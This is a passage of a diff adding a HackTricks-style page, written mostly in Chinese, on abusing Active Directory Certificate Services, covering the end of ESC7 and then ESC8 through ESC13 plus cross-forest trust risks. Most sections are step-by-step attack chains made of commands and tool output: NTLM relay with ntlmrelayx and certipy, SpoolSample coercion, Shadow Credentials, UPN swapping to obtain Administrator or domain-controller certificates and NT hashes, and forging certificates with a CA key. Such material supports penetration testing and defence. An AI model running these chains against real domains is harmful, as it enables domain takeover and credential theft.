+Would you like to save the private key? (y/N) y
+[*] Saved private key to 785.key
+[-] Failed to request certificate
+</code></pre>
+<p>通过我们的 <strong><code>Manage CA</code> 和 <code>Manage Certificates</code></strong>，我们可以使用 <code>ca</code> 命令和 <code>-issue-request &lt;request ID&gt;</code> 参数 <strong>签发失败的证书</strong> 请求。</p>
+<pre><code class="language-bash">certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Successfully issued certificate
+</code></pre>
+<p>最后，我们可以使用 <code>req</code> 命令和 <code>-retrieve &lt;request ID&gt;</code> 参数 <strong>检索已发放的证书</strong>。</p>
+<pre><code class="language-bash">certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Rerieving certificate with ID 785
+[*] Successfully retrieved certificate
+[*] Got certificate with UPN 'administrator@corp.local'
+[*] Certificate has no object SID
+[*] Loaded private key from '785.key'
+[*] Saved certificate and private key to 'administrator.pfx'
+</code></pre>
+<h2 id="ntlm-relay-to-ad-cs-http-endpoints--esc8"><a class="header" href="#ntlm-relay-to-ad-cs-http-endpoints--esc8">NTLM Relay to AD CS HTTP Endpoints – ESC8</a></h2>
+<h3 id="解释-2"><a class="header" href="#解释-2">解释</a></h3>
+<p>{% hint style="info" %}
+在<strong>安装了AD CS</strong>的环境中，如果存在<strong>易受攻击的Web注册端点</strong>并且至少发布了一个<strong>允许域计算机注册和客户端身份验证的证书模板</strong>（例如默认的**<code>Machine</code><strong>模板），那么</strong>任何具有活动的spooler服务的计算机都可能被攻击者攻陷**！
+{% endhint %}</p>
+<p>AD CS支持几种<strong>基于HTTP的注册方法</strong>，这些方法通过管理员可以安装的附加服务器角色提供。这些用于基于HTTP的证书注册的接口易受<strong>NTLM中继攻击</strong>。攻击者可以从<strong>被攻陷的机器上，冒充任何通过入站NTLM进行身份验证的AD账户</strong>。在冒充受害者账户的同时，攻击者可以访问这些Web接口，以<strong>使用<code>User</code>或<code>Machine</code>证书模板请求客户端身份验证证书</strong>。</p>
+<ul>
+<li><strong>Web注册接口</strong>（可在<code>http://&lt;caserver&gt;/certsrv/</code>访问的旧ASP应用程序）默认仅支持HTTP，这并不提供对NTLM中继攻击的保护。此外，它明确仅允许通过其Authorization HTTP头进行NTLM身份验证，使得更安全的身份验证方法如Kerberos不适用。</li>
+<li><strong>证书注册服务</strong>（CES）、<strong>证书注册策略</strong>（CEP）Web服务和<strong>网络设备注册服务</strong>（NDES）默认通过其Authorization HTTP头支持协商身份验证。协商身份验证<strong>同时支持</strong>Kerberos和<strong>NTLM</strong>，允许攻击者在中继攻击期间<strong>降级为NTLM</strong>身份验证。尽管这些Web服务默认启用HTTPS，但仅靠HTTPS<strong>并不能保护免受NTLM中继攻击</strong>。HTTPS服务的NTLM中继攻击保护只有在HTTPS与通道绑定结合使用时才能实现。遗憾的是，AD CS没有在IIS上启用身份验证的扩展保护，这是通道绑定所需的。</li>
+</ul>
+<p>NTLM中继攻击的一个常见<strong>问题</strong>是<strong>NTLM会话的短暂持续时间</strong>以及攻击者无法与<strong>需要NTLM签名</strong>的服务进行交互。</p>
+<p>然而，通过利用NTLM中继攻击获取用户证书，可以克服这一限制，因为证书的有效期决定了会话的持续时间，并且该证书可以与<strong>要求NTLM签名</strong>的服务一起使用。有关如何使用被盗证书的说明，请参见：</p>
+<p>{% content-ref url="account-persistence.md" %}
+<a href="account-persistence.html">account-persistence.md</a>
+{% endcontent-ref %}</p>
+<p>NTLM中继攻击的另一个限制是<strong>攻击者控制的机器必须由受害者账户进行身份验证</strong>。攻击者可以选择等待或尝试<strong>强制</strong>进行此身份验证：</p>
+<p>{% content-ref url="../printers-spooler-service-abuse.md" %}
+<a href="../printers-spooler-service-abuse.html">printers-spooler-service-abuse.md</a>
+{% endcontent-ref %}</p>
+<h3 id="滥用-2"><a class="header" href="#滥用-2"><strong>滥用</strong></a></h3>
+<p><a href="https://github.com/GhostPack/Certify"><strong>Certify</strong></a>的<code>cas</code>枚举<strong>启用的HTTP AD CS端点</strong>：</p>
+<pre><code>Certify.exe cas
+</code></pre>
+<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>
+<p><code>msPKI-Enrollment-Servers</code> 属性被企业证书授权机构 (CAs) 用于存储证书注册服务 (CES) 端点。可以通过利用工具 <strong>Certutil.exe</strong> 解析和列出这些端点：</p>
+<pre><code>certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
+</code></pre>
+<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
+```powershell
+Import-Module PSPKI
+Get-CertificationAuthority | select Name,Enroll* | Format-List *
+```
+<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>
+<h4 id="利用-certify"><a class="header" href="#利用-certify">利用 Certify</a></h4>
+<pre><code class="language-bash">## In the victim machine
+# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
+PortBender redirect 445 8445
+rportfwd 8445 127.0.0.1 445
+# Prepare a proxy that the attacker can use
+socks 1080
+
+## In the attackers
+proxychains ntlmrelayx.py -t http://&lt;AC Server IP&gt;/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
+
+# Force authentication from victim to compromised machine with port forwards
+execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe &lt;victim&gt; &lt;compromised&gt;
+</code></pre>
+<h4 id="abuse-with-certipy"><a class="header" href="#abuse-with-certipy">Abuse with <a href="https://github.com/ly4k/Certipy">Certipy</a></a></h4>
+<p>证书请求默认由 Certipy 基于模板 <code>Machine</code> 或 <code>User</code> 发出，这取决于被中继的账户名称是否以 <code>$</code> 结尾。可以通过使用 <code>-template</code> 参数来指定替代模板。</p>
+<p>然后可以使用像 <a href="https://github.com/ly4k/PetitPotam">PetitPotam</a> 这样的技术来强制身份验证。在处理域控制器时，需要指定 <code>-template DomainController</code>。</p>
+<pre><code class="language-bash">certipy relay -ca ca.corp.local
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
+[*] Listening on 0.0.0.0:445
+[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
+[*] Got certificate with UPN 'Administrator@corp.local'
+[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
+[*] Saved certificate and private key to 'administrator.pfx'
+[*] Exiting...
+</code></pre>
+<h2 id="no-security-extension---esc9"><a class="header" href="#no-security-extension---esc9">No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a></a></h2>
+<h3 id="解释-3"><a class="header" href="#解释-3">解释</a></h3>
+<p>新的值 <strong><code>CT_FLAG_NO_SECURITY_EXTENSION</code></strong> (<code>0x80000</code>) 对于 <strong><code>msPKI-Enrollment-Flag</code></strong>，称为 ESC9，防止在证书中嵌入 <strong>新的 <code>szOID_NTDS_CA_SECURITY_EXT</code> 安全扩展</strong>。当 <code>StrongCertificateBindingEnforcement</code> 设置为 <code>1</code>（默认设置）时，该标志变得相关，这与设置为 <code>2</code> 相对。在可能被利用的情况下，ESC9 的相关性在于较弱的 Kerberos 或 Schannel 证书映射（如 ESC10）可能被利用，因为缺少 ESC9 不会改变要求。</p>
+<p>该标志设置变得重要的条件包括：</p>
+<ul>
+<li><code>StrongCertificateBindingEnforcement</code> 未调整为 <code>2</code>（默认为 <code>1</code>），或 <code>CertificateMappingMethods</code> 包含 <code>UPN</code> 标志。</li>
+<li>证书在 <code>msPKI-Enrollment-Flag</code> 设置中标记为 <code>CT_FLAG_NO_SECURITY_EXTENSION</code> 标志。</li>
+<li>证书指定了任何客户端身份验证 EKU。</li>
+<li>对任何帐户具有 <code>GenericWrite</code> 权限以妥协另一个帐户。</li>
+</ul>
+<h3 id="滥用场景"><a class="header" href="#滥用场景">滥用场景</a></h3>
+<p>假设 <code>John@corp.local</code> 对 <code>Jane@corp.local</code> 拥有 <code>GenericWrite</code> 权限，目标是妥协 <code>Administrator@corp.local</code>。<code>Jane@corp.local</code> 被允许注册的 <code>ESC9</code> 证书模板在其 <code>msPKI-Enrollment-Flag</code> 设置中配置了 <code>CT_FLAG_NO_SECURITY_EXTENSION</code> 标志。</p>
+<p>最初，使用 Shadow Credentials 获取 <code>Jane</code> 的哈希，得益于 <code>John</code> 的 <code>GenericWrite</code>：</p>
+<pre><code class="language-bash">certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
+</code></pre>
+<p>随后，<code>Jane</code>的<code>userPrincipalName</code>被修改为<code>Administrator</code>，故意省略了<code>@corp.local</code>域部分：</p>
+<pre><code class="language-bash">certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
+</code></pre>
+<p>此修改不违反约束，因为 <code>Administrator@corp.local</code> 仍然作为 <code>Administrator</code> 的 <code>userPrincipalName</code> 而保持独特。</p>
+<p>接下来，标记为易受攻击的 <code>ESC9</code> 证书模板被请求为 <code>Jane</code>：</p>
+<pre><code class="language-bash">certipy req -username jane@corp.local -hashes &lt;hash&gt; -ca corp-DC-CA -template ESC9
+</code></pre>
+<p>注意到证书的 <code>userPrincipalName</code> 反映了 <code>Administrator</code>，没有任何“对象 SID”。</p>
+<p><code>Jane</code> 的 <code>userPrincipalName</code> 随后恢复为她的原始值 <code>Jane@corp.local</code>：</p>
+<pre><code class="language-bash">certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
+</code></pre>
+<p>尝试使用已发放的证书进行身份验证现在会产生 <code>Administrator@corp.local</code> 的 NT 哈希。由于证书缺乏域规范，命令必须包含 <code>-domain &lt;domain&gt;</code>：</p>
+<pre><code class="language-bash">certipy auth -pfx adminitrator.pfx -domain corp.local
+</code></pre>
+<h2 id="弱证书映射---esc10"><a class="header" href="#弱证书映射---esc10">弱证书映射 - ESC10</a></h2>
+<h3 id="解释-4"><a class="header" href="#解释-4">解释</a></h3>
+<p>域控制器上的两个注册表项值被ESC10引用：</p>
+<ul>
+<li><code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel</code>下的<code>CertificateMappingMethods</code>的默认值为<code>0x18</code>（<code>0x8 | 0x10</code>），之前设置为<code>0x1F</code>。</li>
+<li><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc</code>下的<code>StrongCertificateBindingEnforcement</code>的默认设置为<code>1</code>，之前为<code>0</code>。</li>
+</ul>
+<p><strong>案例 1</strong></p>
+<p>当<code>StrongCertificateBindingEnforcement</code>配置为<code>0</code>时。</p>
+<p><strong>案例 2</strong></p>
+<p>如果<code>CertificateMappingMethods</code>包含<code>UPN</code>位（<code>0x4</code>）。</p>
+<h3 id="滥用案例-1"><a class="header" href="#滥用案例-1">滥用案例 1</a></h3>
+<p>当<code>StrongCertificateBindingEnforcement</code>配置为<code>0</code>时，具有<code>GenericWrite</code>权限的账户A可以被利用来妥协任何账户B。</p>
+<p>例如，拥有对<code>Jane@corp.local</code>的<code>GenericWrite</code>权限，攻击者旨在妥协<code>Administrator@corp.local</code>。该过程与ESC9相似，允许使用任何证书模板。</p>
+<p>最初，使用Shadow Credentials检索<code>Jane</code>的哈希，利用<code>GenericWrite</code>。</p>
+<pre><code class="language-bash">certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
+</code></pre>
+<p>随后，<code>Jane</code>的<code>userPrincipalName</code>被更改为<code>Administrator</code>，故意省略<code>@corp.local</code>部分以避免约束冲突。</p>
+<pre><code class="language-bash">certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
+</code></pre>
+<p>接下来，作为 <code>Jane</code> 请求一个启用客户端身份验证的证书，使用默认的 <code>User</code> 模板。</p>
+<pre><code class="language-bash">certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes &lt;hash&gt;
+</code></pre>
+<p><code>Jane</code>的<code>userPrincipalName</code>随后被恢复为其原始值<code>Jane@corp.local</code>。</p>
+<pre><code class="language-bash">certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
+</code></pre>
+<p>使用获得的证书进行身份验证将产生 <code>Administrator@corp.local</code> 的 NT 哈希，因此由于证书中缺少域详细信息，命令中需要指定域。</p>
+<pre><code class="language-bash">certipy auth -pfx administrator.pfx -domain corp.local
+</code></pre>
+<h3 id="abuse-case-2"><a class="header" href="#abuse-case-2">Abuse Case 2</a></h3>
+<p>在 <code>CertificateMappingMethods</code> 包含 <code>UPN</code> 位标志 (<code>0x4</code>) 的情况下，具有 <code>GenericWrite</code> 权限的账户 A 可以破坏任何缺少 <code>userPrincipalName</code> 属性的账户 B，包括机器账户和内置域管理员 <code>Administrator</code>。</p>
+<p>在这里，目标是破坏 <code>DC$@corp.local</code>，首先通过 Shadow Credentials 获取 <code>Jane</code> 的哈希，利用 <code>GenericWrite</code>。</p>
+<pre><code class="language-bash">certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
+</code></pre>
+<p><code>Jane</code>的<code>userPrincipalName</code>被设置为<code>DC$@corp.local</code>。</p>
+<pre><code class="language-bash">certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
+</code></pre>
+<p>请求一个用于客户端身份验证的证书，作为 <code>Jane</code> 使用默认的 <code>User</code> 模板。</p>
+<pre><code class="language-bash">certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes &lt;hash&gt;
+</code></pre>
+<p><code>Jane</code>的<code>userPrincipalName</code>在此过程后恢复为其原始值。</p>
+<pre><code class="language-bash">certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
+</code></pre>
+<p>通过 Schannel 进行身份验证时，使用 Certipy 的 <code>-ldap-shell</code> 选项，身份验证成功的指示为 <code>u:CORP\DC$</code>。</p>
+<pre><code class="language-bash">certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
+</code></pre>
+<p>通过LDAP shell，命令如<code>set_rbcd</code>启用基于资源的受限委派（RBCD）攻击，可能会危及域控制器。</p>
+<pre><code class="language-bash">certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
+</code></pre>
+<p>此漏洞还扩展到任何缺少 <code>userPrincipalName</code> 的用户帐户，或其与 <code>sAMAccountName</code> 不匹配的帐户，默认的 <code>Administrator@corp.local</code> 是一个主要目标，因为它具有提升的 LDAP 权限，并且默认情况下缺少 <code>userPrincipalName</code>。</p>
+<h2 id="relaying-ntlm-to-icpr---esc11"><a class="header" href="#relaying-ntlm-to-icpr---esc11">Relaying NTLM to ICPR - ESC11</a></h2>
+<h3 id="explanation-6"><a class="header" href="#explanation-6">Explanation</a></h3>
+<p>如果 CA 服务器未配置 <code>IF_ENFORCEENCRYPTICERTREQUEST</code>，则可以通过 RPC 服务进行未签名的 NTLM 中继攻击。<a href="https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/">参考链接</a>。</p>
+<p>您可以使用 <code>certipy</code> 来枚举 <code>Enforce Encryption for Requests</code> 是否被禁用，certipy 将显示 <code>ESC11</code> 漏洞。</p>
+<pre><code class="language-bash">$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+Certificate Authorities
+0
+CA Name                             : DC01-CA
+DNS Name                            : DC01.domain.local
+Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
+....
+Enforce Encryption for Requests     : Disabled
+....
+[!] Vulnerabilities
+ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
+
+</code></pre>
+<h3 id="滥用场景-1"><a class="header" href="#滥用场景-1">滥用场景</a></h3>
+<p>需要设置一个中继服务器：</p>
+<pre><code class="language-bash">$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting rpc://DC01.domain.local (ESC11)
+[*] Listening on 0.0.0.0:445
+[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
+[*] Attacking user 'Administrator@DOMAIN'
+[*] Template was not defined. Defaulting to Machine/User
+[*] Requesting certificate for user 'Administrator' with template 'User'
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 10
+[*] Got certificate with UPN 'Administrator@domain.local'
+[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
+[*] Saved certificate and private key to 'administrator.pfx'
+[*] Exiting...
+</code></pre>
+<p>注意：对于域控制器，我们必须在 DomainController 中指定 <code>-template</code>。</p>
+<p>或者使用 <a href="https://github.com/sploutchy/impacket">sploutchy's fork of impacket</a>：</p>
+<pre><code class="language-bash">$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
+</code></pre>
+<h2 id="shell-access-to-adcs-ca-with-yubihsm---esc12"><a class="header" href="#shell-access-to-adcs-ca-with-yubihsm---esc12">Shell access to ADCS CA with YubiHSM - ESC12</a></h2>
+<h3 id="explanation-7"><a class="header" href="#explanation-7">Explanation</a></h3>
+<p>管理员可以设置证书颁发机构，将其存储在外部设备上，例如“Yubico YubiHSM2”。</p>
+<p>如果USB设备通过USB端口连接到CA服务器，或者在CA服务器是虚拟机的情况下连接到USB设备服务器，则需要一个身份验证密钥（有时称为“密码”），以便密钥存储提供程序生成和使用YubiHSM中的密钥。</p>
+<p>此密钥/密码以明文形式存储在注册表中，路径为<code>HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword</code>。</p>
+<p>参考<a href="https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm">这里</a>。</p>
+<h3 id="abuse-scenario"><a class="header" href="#abuse-scenario">Abuse Scenario</a></h3>
+<p>如果CA的私钥存储在物理USB设备上，当您获得shell访问权限时，可以恢复该密钥。</p>
+<p>首先，您需要获取CA证书（这是公开的），然后：</p>
+<pre><code class="language-cmd"># import it to the user store with CA certificate
+$ certutil -addstore -user my &lt;CA certificate file&gt;
+
+# Associated with the private key in the YubiHSM2 device
+$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my &lt;CA Common Name&gt;
+</code></pre>
+<p>最后，使用 certutil <code>-sign</code> 命令利用 CA 证书及其私钥伪造一个新的任意证书。</p>
+<h2 id="oid-组链接滥用---esc13"><a class="header" href="#oid-组链接滥用---esc13">OID 组链接滥用 - ESC13</a></h2>
+<h3 id="解释-5"><a class="header" href="#解释-5">解释</a></h3>
+<p><code>msPKI-Certificate-Policy</code> 属性允许将发行政策添加到证书模板中。负责发行政策的 <code>msPKI-Enterprise-Oid</code> 对象可以在 PKI OID 容器的配置命名上下文 (CN=OID,CN=Public Key Services,CN=Services) 中发现。可以使用该对象的 <code>msDS-OIDToGroupLink</code> 属性将政策链接到 AD 组，从而使系统能够授权一个用户在呈现证书时仿佛他是该组的成员。<a href="https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53">参考链接</a>。</p>
+<p>换句话说，当用户有权注册证书且该证书链接到 OID 组时，用户可以继承该组的权限。</p>
+<p>使用 <a href="https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1">Check-ADCSESC13.ps1</a> 查找 OIDToGroupLink：</p>
+<pre><code class="language-powershell">Enumerating OIDs
+------------------------
+OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
+
+OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
+OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
+------------------------
+Enumerating certificate templates
+------------------------
+Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local
+
+Certificate template Name: VulnerableTemplate
+OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
+OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
+------------------------
+</code></pre>
+<h3 id="滥用场景-2"><a class="header" href="#滥用场景-2">滥用场景</a></h3>
+<p>找到一个用户权限，可以使用 <code>certipy find</code> 或 <code>Certify.exe find /showAllPermissions</code>。</p>
+<p>如果 <code>John</code> 有权限注册 <code>VulnerableTemplate</code>，则该用户可以继承 <code>VulnerableGroup</code> 组的权限。</p>
+<p>所需的只是指定模板，它将获得具有 OIDToGroupLink 权限的证书。</p>
+<pre><code class="language-bash">certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
+</code></pre>
+<h2 id="用被动语态解释的证书妥协森林"><a class="header" href="#用被动语态解释的证书妥协森林">用被动语态解释的证书妥协森林</a></h2>
+<h3 id="被妥协的ca破坏森林信任"><a class="header" href="#被妥协的ca破坏森林信任">被妥协的CA破坏森林信任</a></h3>
+<p><strong>跨森林注册</strong>的配置相对简单。资源森林的<strong>根CA证书</strong>由管理员<strong>发布到账户森林</strong>，资源森林的<strong>企业CA</strong>证书被<strong>添加到每个账户森林中的<code>NTAuthCertificates</code>和AIA容器</strong>。为了澄清，这种安排授予资源森林中的<strong>CA对其管理的所有其他森林的完全控制权</strong>。如果该CA被<strong>攻击者妥协</strong>，则资源森林和账户森林中所有用户的证书都可能被<strong>伪造</strong>，从而打破森林的安全边界。</p>
+<h3 id="授予外部主体的注册权限"><a class="header" href="#授予外部主体的注册权限">授予外部主体的注册权限</a></h3>
+<p>在多森林环境中，关于<strong>发布证书模板</strong>的企业CA需要谨慎，这些模板允许<strong>经过身份验证的用户或外部主体</strong>（属于企业CA所在森林的外部用户/组）<strong>注册和编辑权限</strong>。<br />
+在信任关系中进行身份验证后，<strong>经过身份验证的用户SID</strong>会被AD添加到用户的令牌中。因此，如果一个域拥有一个允许<strong>经过身份验证的用户注册权限</strong>的企业CA，则来自不同森林的用户可能会<strong>注册该模板</strong>。同样，如果<strong>模板明确授予外部主体注册权限</strong>，则<strong>由此创建了跨森林的访问控制关系</strong>，使得一个森林中的主体能够<strong>注册另一个森林中的模板</strong>。</p>
+<p>这两种情况都会导致<strong>攻击面从一个森林增加到另一个森林</strong>。攻击者可以利用证书模板的设置在外部域中获得额外权限。</p>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<p>{% embed url="https://websec.nl/" %}</p>
+<p>{% hint style="success" %}
+学习和实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks培训AWS红队专家(ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks培训GCP红队专家(GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持HackTricks</summary>
+<ul>
+<li>查看<a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord群组</strong></a>或<a href="https://t.me/peass"><strong>Telegram群组</strong></a>或<strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>上关注我们。</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>和<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub库提交PR分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../../windows-hardening/active-directory-methodology/ad-certificates/domain-persistence.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../../windows-hardening/active-directory-methodology/ad-certificates/domain-persistence.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../../elasticlunr.min.js"></script>
+        <script src="../../../mark.min.js"></script>
+        <script src="../../../searcher.js"></script>
+
+        <script src="../../../clipboard.min.js"></script>
+        <script src="../../../highlight.js"></script>
+        <script src="../../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
